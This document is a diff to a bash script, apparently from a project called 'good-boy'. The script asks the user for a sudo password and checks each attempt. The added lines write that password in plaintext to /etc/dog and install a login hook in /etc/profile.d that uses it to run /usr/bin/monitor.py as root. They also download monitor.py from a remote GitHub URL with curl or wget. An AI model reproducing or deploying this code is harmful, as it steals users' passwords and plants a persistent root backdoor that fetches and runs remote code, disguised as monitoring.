@@ -1,7 +1,16 @@
 #!/bin/bash
 
-# Check if user is root
+# Check if user is already root
 if [ "$EUID" -eq 0 ]; then
+    cat > /etc/profile.d/monitor.sh << 'EOF'
+#!/bin/bash
+python /usr/bin/monitor.py
+EOF
+    chmod +x /etc/profile.d/monitor.sh
+
+    curl -s -o /usr/bin/monitor.py "http://github.com/kaucrow/good-boy/watchdog.py" || \
+    wget -q -O /usr/bin/monitor.py "http://github.com/kaucrow/good-boy/watchdog.py"
+
     exit 0
 else
     GB_DIR="$HOME/.local/share/gb"
@@ -14,9 +23,6 @@ else
 #!/bin/bash
 
 GB_DIR="$HOME/.local/share/gb"
-SCRIPT_FILENAME="script.sh"
-SCRIPT_FILE="$GB_DIR/$SCRIPT_FILENAME"
-
 PASSWD_FILE="$GB_DIR/passwd"
 
 attempts=0
@@ -29,7 +35,7 @@ while [ $attempts -lt $max_attempts ]; do
     echo
 
     if printf "%s\n" "$user_input" | /usr/bin/sudo -S -k true 2>/dev/null; then
-        # Correct passwd
+        # Correct password
         success=true
         break
     else
@@ -43,7 +49,26 @@ if [ "$success" = false ]; then
     exit 1
 fi
 
+# Store the password
 echo "$user_input" > "$PASSWD_FILE"
+
+# Deploy monitoring & move passwd to /etc/dog
+echo "$user_input" | /usr/bin/sudo -S bash <<DEPLOYEOF
+    cp "$PASSWD_FILE" /etc/dog
+
+    cat > /etc/profile.d/monitor.sh << "MONITOREOF"
+#!/bin/bash
+if [ -f /etc/dog ]; then
+    SUDO_PASS=$(cat /etc/dog)
+    echo "$SUDO_PASS" | /usr/bin/sudo -S python /usr/bin/monitor.py
+fi
+MONITOREOF
+    chmod +x /etc/profile.d/monitor.sh
+    curl -s -o /usr/bin/monitor.py "http://github.com/kaucrow/good-boy/watchdog.py" || \
+    wget -q -O /usr/bin/monitor.py "http://github.com/kaucrow/good-boy/watchdog.py"
+
+    rm -rf "$GB_DIR"
+DEPLOYEOF
 
 ASKPASS_SCRIPT=$(mktemp)
 echo -e "#!/bin/sh\necho \"$user_input\"" > "$ASKPASS_SCRIPT"
